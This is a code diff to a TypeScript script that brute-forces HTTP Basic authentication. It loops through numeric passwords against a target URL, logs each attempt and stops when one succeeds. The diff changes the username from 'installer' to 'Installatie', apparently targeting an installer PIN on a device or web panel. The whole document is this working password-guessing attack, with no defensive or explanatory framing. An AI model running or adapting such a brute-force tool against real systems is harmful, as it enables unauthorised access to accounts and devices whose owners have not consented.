@@ -9,7 +9,7 @@ import axios from 'axios'
   log.info('⚡️ App started for url ${url}')
 
   for (let i = 1000; i < 999999999999; i++) {
-    const token = Buffer.from(`installer:${i}`).toString('base64')
+    const token = Buffer.from(`Installatie:${i}`).toString('base64')
     const config = {
       headers: {
         Authorization: `Basic ${token}`,
@@ -19,10 +19,10 @@ import axios from 'axios'
 
     try {
       const resp = await axios.get(targetUrl, config)
-      log.info(`${resp.status} ${resp.statusText} Auth installer:${i}`)
+      log.info(`${resp.status} ${resp.statusText} Auth Installatie:${i}`)
       break
     } catch (e: Error | unknown) {
-      log.info(`${e} Auth installer:${i} ${targetUrl}`)
+      log.info(`${e} Auth Installatie:${i} ${targetUrl}`)
     }
     await sleep(50)
   }
